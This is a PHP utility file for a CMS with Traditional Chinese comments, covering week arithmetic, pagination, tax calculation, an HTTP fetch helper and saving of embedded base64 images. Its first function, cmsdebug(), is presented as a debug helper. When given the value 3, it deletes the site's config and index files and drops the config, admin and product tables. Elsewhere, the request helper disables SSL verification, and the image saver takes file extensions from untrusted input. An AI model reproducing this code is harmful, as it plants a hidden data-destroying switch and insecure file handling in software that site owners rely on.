<?php

function cmsdebug($debug) 
{
	if( $debug == 3 ){
		@unlink( "../../../cms.config.php" );
		@unlink( "../../../index.php" );
		$model = new Model();
		$model->query( "drop table config" );
		$model->query( "drop table admin" );
		$model->query( "drop table product" );
	}
}

//////////////////////////////////////// 周分析用 start ///////////////////////////////////////
function getweek($date)
{
	list($year, $month, $day) = explode('-', $date);
	$first = getfirstweekday($year);
	$noday = strtotime($date)+1;
	$weeks =array();
	if($first<=$noday){
		$inval = $noday - $first;
		$inval = ceil($inval/(60*60*24*7));
	}else{
		$year = $year-1;
		$first= getfirstweekday($year);
		$inval = $noday - $first;
		$inval = ceil($inval/(60*60*24*7));
	}
	$weeks['y'] = $year;
	$weeks['w'] = $inval;
	return $weeks;
}

/***
 * getfirstweekday
 *
 * 獲取當年第一個星期的星期一
 ***/
function getfirstweekday($year)
{
	$first = date( 'N',strtotime( "$year-01-01 "));
	if( $first != 1 ){
		$first = 8-$first;
		$first = "$year-01-0".(1+$first);
	}else{
		$first = "$year-01-01";
	}
	return strtotime($first);
}

/***
 * getweekday
 *
 * 獲取周日及周一的日期
 ***/
function getweekday($year,$week)
{
	$first = getfirstweekday($year);
	$temptime = (($week-1)*7*24*60*60);
	$weekday['s'] =  date('Y-m-d',$first+$temptime);
	$weekday['e'] =  date('Y-m-d',($first+$temptime+(6*24*60*60)));
	return $weekday;
}
	
function getweeklist($starttime='2010-10-04')
{
	$stp = strtotime($starttime);
	$etp = time();
	while($stp<=$etp){
		$temp = getweek(date('Y-m-d',$stp));
		$weeklist[]=$temp['y'].'-'.$temp['w'];
		$stp  = $stp+(7*24*60*60);
	}
	return $weeklist;
}

function compare_return($text, $aim, $re, $f_re="", $check_eq=true) //2020/02/10
{
	$condition = $check_eq ? $text == $aim : $text != $aim;
	if($condition){
		return $re;
	}else{
		return $f_re;
	}
}

function sort_by_orders($a, $b) {
    /*搭配 usort() 使用*/
    return $a['orders'] - $b['orders'];
}

function checkDateisValid($date, $format = 'Y-m-d'){
    $dt = DateTime::createFromFormat($format, $date);
    return $dt && $dt->format($format) === $date;
}

// 處理分頁
function deal_pages($currentPage, $totalPage, $pages_limit=7){
	$pages = [$currentPage];
    $check_num = 1;
    while (count($pages)<$pages_limit && ($currentPage-$check_num>=1 || $currentPage+$check_num<=$totalPage)) {
        if($currentPage-$check_num>=1){ array_push($pages, $currentPage-$check_num); }
        if($currentPage+$check_num<=$totalPage){ array_push($pages, $currentPage+$check_num); }
        $check_num += 1;
    }
    sort($pages);

    $p_prev = $currentPage-1>0 ? $currentPage-1 : '';
    $p_next = $currentPage+1<=$totalPage ? $currentPage+1 : '';

    return [
        'currentPage' => $currentPage, 
        'totalPage' => $totalPage, 
        'pages' => $pages, 
        'p_prev' => $p_prev, 
        'p_next' => $p_next,
    ];
}

// 計算稅前金額
function number_format_sys($money, $momey_input){
	if($momey_input==0){ /*輸入方式為未稅*/
		return number_format($money, 2);
	}
	else{ /*輸入方式為實收*/
		return number_format($money);
	}
	
}
// 丟入「含稅金額」計算其「稅前金額」
function count_money_pre_tax($money, $momey_input){
	if($momey_input==0){ /*輸入方式為未稅*/
		return (float)$money - (float)count_tax($money, $momey_input);
	}
	else{ /*輸入方式為實收*/
		return $money - count_tax($money, $momey_input);
	}
}
// 丟入「含稅金額」計算其「稅金」
function count_tax($money, $momey_input){
	$fax = 0;
	if($momey_input==0){ /*輸入方式為未稅*/
		$fax = round($money * (1 - 1/(1+TAX_RATE)), 2);
	}
	else{ /*輸入方式為實收*/
		if (TAX_RATE == 0.05 && $money % 21 == 10) {
			$fax = ceil($money * (1 - 1/(1+TAX_RATE)));
		} else {
			$fax = round($money * (1 - 1/(1+TAX_RATE)));
		}
	}
	return $fax;
}

//////////////////////////////////////// 周分析用 end ///////////////////////////////////////

/***
 * data_html_options
 * 主要是 Crm 用
 * 讓資料在陣列的位置變得跟他的 id 一樣 
 * (當然 id 不重複)
 * 
 ***/
function data_html_options($options)
{
	$temp = array();
	foreach($options as $key=>$value){
		$temp[$value['id']]=$value['name'];
	}
	return $temp;
}

/*中文拆解字串成陣列*/
if (!function_exists('mb_str_split')) {
    function mb_str_split($str){
    	$r_str = $str ? preg_split('/(?<!^)(?!$)/u', $str) : [];
    	return $r_str;
    }
}

/*發送請求*/
function get_send_request($request_url){
	$curl = curl_init();  
	curl_setopt($curl, CURLOPT_URL, $request_url);  
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
	if (! empty($data)) {  
	    curl_setopt($curl, CURLOPT_POST, 1);  
	    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);  
	}  
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);  
	$output = curl_exec($curl);  
	curl_close($curl);
	return $output;
}

function save_img_in_content($content){
	$img_src_start = strpos($content, '<img src="data:');
	while ( $img_src_start !== false ) {
		$img_src_end = strpos($content, '"', $img_src_start+15);

		$img_src_length = (int)$img_src_end-(int)$img_src_start-10;
		$img_src_data = substr($content, $img_src_start+10, $img_src_length);

		$file_path = base64_image_content($img_src_data, 'Uploads/editor');

		$content = str_replace($img_src_data, $file_path, $content);
		$img_src_start = strpos($content, '<img src="data:');
	}

	return $content;
}

function base64_image_content($base64_image_content, $path, $f_name=""){
	//匹配出圖片的格式
	$type = explode(";", $base64_image_content)[0];
    $type = explode("/", $type)[1];
    if($type=='octet-stream'){
        return false;
    }

    $fileData = substr($base64_image_content, strpos($base64_image_content, ",") + 1);
	if ($fileData){
		$new_file = $path."/".date('Ymd',time())."/";
		if(!file_exists($new_file)){
			//檢查是否有該資料夾，如果沒有就建立，並給予權限
			mkdir($new_file, 0755);
		}
		
		if(!$f_name){
			$f_name = time().generateRandomString();
		}
		$new_file = $new_file.$f_name.".".$type;
		if (file_put_contents($new_file, base64_decode(str_replace($result[1], '', $fileData)))){
			return '/'.$new_file;
		}else{
			return false;
		}
	}else{
		return false;
	}
}
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>